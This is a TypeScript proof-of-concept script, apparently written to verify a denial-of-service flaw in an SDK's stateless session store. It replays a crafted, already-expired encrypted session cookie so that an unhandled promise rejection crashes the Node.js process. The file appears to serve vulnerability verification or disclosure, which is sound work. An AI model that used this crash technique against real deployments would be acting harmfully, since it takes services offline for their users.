import { RequestCookies, ResponseCookies } from '@edge-runtime/cookies';
// Utility for encrypt/decrypt cookies in the SDK
import * as cookies from './src/server/cookies.js';
import { StatelessSessionStore } from './src/server/session/stateless-session-store.js';
import { SessionData } from './src/types/index.js';

// This script is designed to crash if the vulnerability is present.
// An unhandled promise rejection will terminate the Node.js process.

const getStore = () => new StatelessSessionStore({
  secret: 'a-super-secret-key-that-is-long-enough',
  absoluteDuration: 1,          // 1-second session lifetime ensures expiration
  inactivityDuration: 1         // keep equal for consistency
});

// We'll craft a minimal payload; contents are irrelevant because expiration is already in the past.
const expiredPayload: SessionData | Record<string, unknown> = { user: 'test' } as any;

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

async function verify() {
  console.log('--- Starting verification for StatelessSessionStore DoS ---');
  const store = getStore();
  const reqCookies = new RequestCookies(new Headers());

  console.log('Step 1: Crafting an already-expired JWE...');
  const expiredAt = Math.floor(Date.now() / 1000) - 60; // 60 seconds in the past
  const expiredJWE = await cookies.encrypt(expiredPayload, 'a-super-secret-key-that-is-long-enough', expiredAt);
  console.log('Expired JWE created.');

  console.log('Step 2: Simulating attack: replaying the expired JWE as both appSession and connection token...');
  const attackReqCookies = new RequestCookies(new Headers());
  attackReqCookies.set('appSession', expiredJWE.toString());
  attackReqCookies.set('__FC_0', expiredJWE.toString());
  console.log('Attack cookies prepared.');

  console.log('Step 3: Calling store.get()... If vulnerable, this will cause an unhandled rejection and crash the process.');
  // NOT wrapping in try/catch – we want the process to crash.
  await store.get(attackReqCookies);

  // If the script reaches this line, the vulnerability is NOT present.
  console.log('--- VERIFICATION FAILED: The process did not crash. The vulnerability may be patched. ---');
}

verify();
